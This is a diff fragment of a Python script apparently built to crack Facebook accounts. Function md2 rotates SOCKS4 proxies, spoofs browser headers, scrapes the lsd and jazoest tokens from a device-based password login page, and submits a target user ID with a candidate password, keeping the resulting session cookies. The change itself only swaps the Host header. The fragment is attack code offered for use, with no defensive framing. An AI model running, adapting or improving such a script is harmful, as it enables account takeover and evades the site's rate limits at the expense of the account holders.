@@ -323,7 +323,7 @@ def md2(idf,pwv):
       open('http.txt','w').write(proxs)
       nip = rc(proxs)
       proxs = {'http': 'socks4://'+nip}
-      ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'en-MA,en;q=0.9,fr-MA;q=0.8,fr;q=0.7,en-GB;q=0.6,en-US;q=0.5'})
+      ses.headers.update({'Host': 'connect.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'en-MA,en;q=0.9,fr-MA;q=0.8,fr;q=0.7,en-GB;q=0.6,en-US;q=0.5'})
       p = ses.get('https://ms-my.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
       dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://ms-my.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
